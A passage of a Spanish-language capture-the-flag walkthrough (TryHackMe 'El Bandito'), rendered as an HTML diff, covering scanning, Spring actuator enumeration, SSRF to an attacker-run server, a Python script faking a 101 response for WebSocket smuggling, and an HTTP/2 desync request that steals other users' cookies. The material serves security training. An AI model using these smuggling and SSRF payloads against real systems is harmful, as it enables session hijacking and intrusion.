+<span class="s1">|     Feature-Policy: microphone &#39;</span>none<span class="s1">&#39;; geolocation &#39;</span>none<span class="s1">&#39;;</span>
+<span class="s1">|     Age: 0</span>
+<span class="s1">|     Server: El Bandito Server</span>
+<span class="s1">|     Accept-Ranges: bytes</span>
+<span class="s1">|     Connection: close</span>
+<span class="s1">|   RTSPRequest: </span>
+<span class="s1">|_    HTTP/1.1 400 Bad Request</span>
+<span class="s1">|_ssl-date: TLS randomness does not represent time</span>
+<span class="s1">631/tcp  open  ipp      CUPS 2.4</span>
+<span class="s1">|_http-title: Forbidden - CUPS v2.4.7</span>
+<span class="s1">|_http-server-header: CUPS/2.4 IPP/2.1</span>
+<span class="s1">8080/tcp open  http     nginx</span>
+<span class="s1">|_http-favicon: Spring Java Framework</span>
+<span class="s1">|_http-title: Site doesn&#39;</span>t<span class="w"> </span>have<span class="w"> </span>a<span class="w"> </span>title<span class="w"> </span><span class="o">(</span>application/json<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span>.
+<span class="m">1</span><span class="w"> </span>service<span class="w"> </span>unrecognized<span class="w"> </span>despite<span class="w"> </span>returning<span class="w"> </span>data.<span class="w"> </span>If<span class="w"> </span>you<span class="w"> </span>know<span class="w"> </span>the<span class="w"> </span>service/version,<span class="w"> </span>please<span class="w"> </span>submit<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>fingerprint<span class="w"> </span>at<span class="w"> </span>https://nmap.org/cgi-bin/submit.cgi?new-service<span class="w"> </span>:
+SF-Port80-TCP:V<span class="o">=</span><span class="m">7</span>.95%T<span class="o">=</span>SSL%I<span class="o">=</span><span class="m">7</span>%D<span class="o">=</span><span class="m">6</span>/29%Time<span class="o">=</span>6860CDAC%P<span class="o">=</span>x86_64-pc-linux-gnu%
+SF:r<span class="o">(</span>GetRequest,1E5,<span class="s2">&quot;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sun,\x2029\x20Jun\</span>
+<span class="s2">SF:x202025\x2005:22:51\x20GMT\r\nContent-Type:\x20text/html;\x20charset=ut</span>
+<span class="s2">SF:f-8\r\nContent-Length:\x2058\r\nContent-Security-Policy:\x20default-src</span>
+<span class="s2">SF:\x20&#39;self&#39;;\x20script-src\x20&#39;self&#39;;\x20object-src\x20&#39;none&#39;;\r\nX-Cont</span>
+<span class="s2">SF:ent-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-XSS</span>
+<span class="s2">SF:-Protection:\x201;\x20mode=block\r\nFeature-Policy:\x20microphone\x20&#39;n</span>
+<span class="s2">SF:one&#39;;\x20geolocation\x20&#39;none&#39;;\r\nAge:\x200\r\nServer:\x20El\x20Bandit</span>
+<span class="s2">SF:o\x20Server\r\nAccept-Ranges:\x20bytes\r\nConnection:\x20close\r\n\r\nn</span>
+<span class="s2">SF:othing\x20to\x20see\x20&lt;script\x20src=&#39;/static/messages\.js&#39;&gt;&lt;/script&gt;&quot;</span>
+SF:<span class="o">)</span>%r<span class="o">(</span>HTTPOptions,1CB,<span class="s2">&quot;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sun,\x2029\x20J</span>
+<span class="s2">SF:un\x202025\x2005:22:52\x20GMT\r\nContent-Type:\x20text/html;\x20charset</span>
+<span class="s2">SF:=utf-8\r\nContent-Length:\x200\r\nAllow:\x20GET,\x20OPTIONS,\x20HEAD,\x</span>
+<span class="s2">SF:20POST\r\nContent-Security-Policy:\x20default-src\x20&#39;self&#39;;\x20script-</span>
+<span class="s2">SF:src\x20&#39;self&#39;;\x20object-src\x20&#39;none&#39;;\r\nX-Content-Type-Options:\x20n</span>
+<span class="s2">SF:osniff\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-XSS-Protection:\x201;\x20</span>
+<span class="s2">SF:mode=block\r\nFeature-Policy:\x20microphone\x20&#39;none&#39;;\x20geolocation\x</span>
+<span class="s2">SF:20&#39;none&#39;;\r\nAge:\x200\r\nServer:\x20El\x20Bandito\x20Server\r\nAccept-</span>
+<span class="s2">SF:Ranges:\x20bytes\r\nConnection:\x20close\r\n\r\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,1C,<span class="s2">&quot;HT</span>
+<span class="s2">SF:TP/1\.1\x20400\x20Bad\x20Request\r\n\r\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>FourOhFourRequest,26C,<span class="s2">&quot;HTT</span>
+<span class="s2">SF:P/1\.1\x20404\x20NOT\x20FOUND\r\nDate:\x20Sun,\x2029\x20Jun\x202025\x20</span>
+<span class="s2">SF:05:23:50\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCont</span>
+<span class="s2">SF:ent-Length:\x20207\r\nContent-Security-Policy:\x20default-src\x20&#39;self&#39;</span>
+<span class="s2">SF:;\x20script-src\x20&#39;self&#39;;\x20object-src\x20&#39;none&#39;;\r\nX-Content-Type-O</span>
+<span class="s2">SF:ptions:\x20nosniff\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-XSS-Protectio</span>
+<span class="s2">SF:n:\x201;\x20mode=block\r\nFeature-Policy:\x20microphone\x20&#39;none&#39;;\x20g</span>
+<span class="s2">SF:eolocation\x20&#39;none&#39;;\r\nAge:\x200\r\nServer:\x20El\x20Bandito\x20Serve</span>
+<span class="s2">SF:r\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;\n&lt;html\x20lang=en&gt;\</span>
+<span class="s2">SF:n&lt;title&gt;404\x20Not\x20Found&lt;/title&gt;\n&lt;h1&gt;Not\x20Found&lt;/h1&gt;\n&lt;p&gt;The\x20r</span>
+<span class="s2">SF:equested\x20URL\x20was\x20not\x20found\x20on\x20the\x20server\.\x20If\x</span>
+<span class="s2">SF:20you\x20entered\x20the\x20URL\x20manually\x20please\x20check\x20your\x</span>
+<span class="s2">SF:20spelling\x20and\x20try\x20again\.&lt;/p&gt;\n&quot;</span><span class="o">)</span><span class="p">;</span>
+Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel
+</code></pre></div></p>
+<h3 id="http">HTTP<a class="headerlink" href="#http" title="Permanent link">&para;</a></h3>
+<p><img alt="alt text" src="img/image.png" /></p>
+<p><img alt="alt text" src="img/image-1.png" /></p>
+<p><img alt="alt text" src="img/image-2.png" /></p>
+<p>Recurso: 
+https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/spring-actuators.html#key-points</p>
+<p><img alt="alt text" src="img/image-3.png" /></p>
+<p>Consultamos la ruta <code>/health</code></p>
+<p><img alt="alt text" src="img/image-4.png" /></p>
+<p>Consultamos la ruta <code>/mappings</code></p>
+<p><img alt="alt text" src="img/image-5.png" /></p>
+<p>ahora es posible obtener otras posibles rutas</p>
+<div class="highlight"><pre><span></span><code>/admin-creds
+/admin-flag
+/token
+/isOnline
+/error
+/heapdump
+/autoconfig
+/trace
+/health
+/dump
+/configprops
+/env/<span class="o">{</span>name:.*
+</code></pre></div>
+<h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
+<p>Probamos con la ruta <code>/isOnline</code></p>
+<div class="highlight"><pre><span></span><code>GET<span class="w"> </span>/isOnline?url<span class="o">=</span>http://10.9.244.36:5555/test.txt<span class="w"> </span>HTTP/1.1
+</code></pre></div>
+<p><img alt="alt text" src="img/image-6.png" /></p>
+<p>El servidor HTTP Python recibió la solicitud, lo que confirmó que el punto final era vulnerable a SSRF (Server-Side Request Forgery).</p>
+<p><img alt="alt text" src="img/image-7.png" /></p>
+<p>Usando este SSRF, se crea un servidor malicioso que siempre respondía con 101, engañando al frontend para que aceptara el túnel WebSocket.</p>
+<div class="highlight"><span class="filename">myserver.py</span><pre><span></span><code>import<span class="w"> </span>sys
+from<span class="w"> </span>http.server<span class="w"> </span>import<span class="w"> </span>HTTPServer,<span class="w"> </span>BaseHTTPRequestHandler
+
+<span class="k">if</span><span class="w"> </span>len<span class="o">(</span>sys.argv<span class="o">)</span>-1<span class="w"> </span>!<span class="o">=</span><span class="w"> </span><span class="m">1</span>:
+<span class="w">    </span>print<span class="o">(</span><span class="s2">&quot;&quot;&quot;</span>
+<span class="s2">Usage: {}</span>
+<span class="s2">    &quot;&quot;&quot;</span>.format<span class="o">(</span>sys.argv<span class="o">[</span><span class="m">0</span><span class="o">]))</span>
+<span class="w">    </span>sys.exit<span class="o">()</span>
+
+class<span class="w"> </span>Redirect<span class="o">(</span>BaseHTTPRequestHandler<span class="o">)</span>:
+<span class="w">   </span>def<span class="w"> </span>do_GET<span class="o">(</span>self<span class="o">)</span>:
+<span class="w">       </span>self.protocol_version<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;HTTP/1.1&quot;</span>
+<span class="w">       </span>self.send_response<span class="o">(</span><span class="m">101</span><span class="o">)</span>
+<span class="w">       </span>self.end_headers<span class="o">()</span>
+
+HTTPServer<span class="o">((</span><span class="s2">&quot;&quot;</span>,<span class="w"> </span>int<span class="o">(</span>sys.argv<span class="o">[</span><span class="m">1</span><span class="o">]))</span>,<span class="w"> </span>Redirect<span class="o">)</span>.serve_forever<span class="o">()</span>
+</code></pre></div>
+<p><img alt="alt text" src="img/image-8.png" /></p>
+<p>En la solicitud <code>/admin-creds</code>es obligatorio el encabezado Host, y se debe dejar dos espacios para que se interprete como el cuerpo.</p>
+<p><img alt="alt text" src="img/image-9.png" /></p>
+<table>
+<thead>
+<tr>
+<th>user</th>
+<th>pass</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>hAckLIEN</td>
+<td>YouCanCatchUsInYourDreams404</td>
+</tr>
+</tbody>
+</table>
+<p>Esta solicitud <code>/admin-flag</code> devolvió con éxito las credenciales de administrador.</p>
+<p><img alt="alt text" src="img/image-10.png" /></p>
+<div class="highlight"><pre><span></span><code>THM<span class="o">{</span>:::MY_DECLINATION:+62°_14<span class="se">\&#39;</span>_31.4<span class="s1">&#39;&#39;</span>:::<span class="o">}</span>
+</code></pre></div>
+<p><img alt="alt text" src="img/image-11.png" /></p>
+<p><img alt="alt text" src="img/image-12.png" /></p>
+<p>Al analizar el frontend JavaScript (messages.js), se identifican dos funciones:</p>
+<ul>
+<li>send_message() → Envía mensajes mediante POST.</li>
+<li>getMessages() → Recupera todos los mensajes almacenados.</li>
+</ul>
+<p><img alt="alt text" src="img/image-16.png" /></p>
+<div class="highlight"><pre><span></span><code>GET<span class="w"> </span>/getMessages<span class="w"> </span>HTTP/2
+Host:<span class="w"> </span>elbandito.thm:80
+Cookie:<span class="w"> </span><span class="nv">session</span><span class="o">=</span>eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.aGDZBA.mxbv5aaUUAY9qia2Dc27uRE35FY
+User-Agent:<span class="w"> </span>Mozilla/5.0<span class="w"> </span><span class="o">(</span>X11<span class="p">;</span><span class="w"> </span>Linux<span class="w"> </span>x86_64<span class="p">;</span><span class="w"> </span>rv:128.0<span class="o">)</span><span class="w"> </span>Gecko/20100101<span class="w"> </span>Firefox/128.0
+Accept:<span class="w"> </span>text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.9,*/*<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.8
+Accept-Language:<span class="w"> </span>en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.5
+Accept-Encoding:<span class="w"> </span>gzip,<span class="w"> </span>deflate,<span class="w"> </span>br
+Referer:<span class="w"> </span>https://elbandito.thm:80/access
+Dnt:<span class="w"> </span><span class="m">1</span>
+Sec-Gpc:<span class="w"> </span><span class="m">1</span>
+Upgrade-Insecure-Requests:<span class="w"> </span><span class="m">1</span>
+Sec-Fetch-Dest:<span class="w"> </span>document
+Sec-Fetch-Mode:<span class="w"> </span>navigate
+Sec-Fetch-Site:<span class="w"> </span>same-origin
+Sec-Fetch-User:<span class="w"> </span>?1
+Priority:<span class="w"> </span><span class="nv">u</span><span class="o">=</span><span class="m">0</span>,<span class="w"> </span>i
+Te:<span class="w"> </span>trailers
+</code></pre></div>
+<p>La aplicación utilizaba HTTP/2, lo que significa que el método anterior de contrabando de WebSocket no funcionaría. Sin embargo, dado que muchos sistemas cambian a HTTP/1.1 en el backend, esto abrió la posibilidad de un ataque de HTTP/2 Desync attack (contrabando H2 → H1).</p>
+<p>Sabiendo que el servidor es vulnerable, ahora hay que convertir esta vulnerabilidad. Para lograr esto, interceptar completamente la solicitud del usuario y enviarla como si fuera un mensaje de la función <code>send_message()</code> para poder verlo reflejado en la función <code>getMessages()</code>, robando así las cookies del usuario.</p>
+<p>Enviamos con el Repeater la carga útil</p>
+<div class="highlight"><pre><span></span><code>POST<span class="w"> </span>/<span class="w"> </span>HTTP/2
+Host:<span class="w"> </span>elbandito.thm:80
+Cookie:<span class="w"> </span><span class="nv">session</span><span class="o">=</span>eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.aGDZBA.mxbv5aaUUAY9qia2Dc27uRE35FY
+User-Agent:<span class="w"> </span>Mozilla/5.0<span class="w"> </span><span class="o">(</span>X11<span class="p">;</span><span class="w"> </span>Linux<span class="w"> </span>x86_64<span class="p">;</span><span class="w"> </span>rv:128.0<span class="o">)</span><span class="w"> </span>Gecko/20100101<span class="w"> </span>Firefox/128.0
+Content-Length:<span class="w"> </span><span class="m">0</span>
+
+POST<span class="w"> </span>/send_message<span class="w"> </span>HTTP/1.1
+Host:<span class="w"> </span>elbandito.thm:80
+Cookie:<span class="w"> </span><span class="nv">session</span><span class="o">=</span>eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.aGDZBA.mxbv5aaUUAY9qia2Dc27uRE35FY
+Content-Length:<span class="w"> </span><span class="m">900</span>
+Content-Type:<span class="w"> </span>application/x-www-form-urlencoded
+
+<span class="nv">data</span><span class="o">=</span>
+</code></pre></div>
+<p><img alt="alt text" src="img/image-13.png" /></p>
+<p><img alt="alt text" src="img/image-14.png" /></p>
+<div class="highlight"><pre><span></span><code><span class="nv">flag</span><span class="o">=</span>THM<span class="o">{</span><span class="se">\u</span>00a1!<span class="se">\u</span>00a1RIGHT_ASCENSION_12h_36m_25.46s!<span class="se">\u</span>00a1!<span class="o">}</span><span class="se">\r\n</span>X-Forwa<span class="s2">&quot;</span>
+</code></pre></div>
+<p><img alt="alt text" src="img/image-15.png" /></p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.path", "content.code.copy", "search.highlight"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
